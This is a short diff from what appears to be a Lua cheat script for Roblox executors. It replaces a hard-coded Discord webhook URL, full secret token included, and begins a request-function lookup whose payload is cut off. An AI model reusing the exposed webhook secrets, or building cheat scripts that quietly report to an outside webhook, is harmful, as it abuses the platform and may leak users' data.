@@ -194,7 +194,7 @@ local TankActive = false
 local DesyncActive = false
 
 -- [[ 2. WEBHOOK INITIALIZATION ]]
-local WebhookURL = "https://discord.com/api/webhooks/1467231677351989563/aSBnMUeot4PzaIO8iUgGIHU2HyK05ezxu-vA5F7V-k_-nnyDqrIg7eh2Zcah0T3XgrJt" 
+local WebhookURL = "https://discord.com/api/webhooks/1473065449343422556/QoXaxdo5HHMaOc75rV_0hWI-M-odwPvJG1N0gQ2In5yaCXF_aEY9XvWykDWOpJrH3Z3V" 
 pcall(function()
     local req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
     if req then
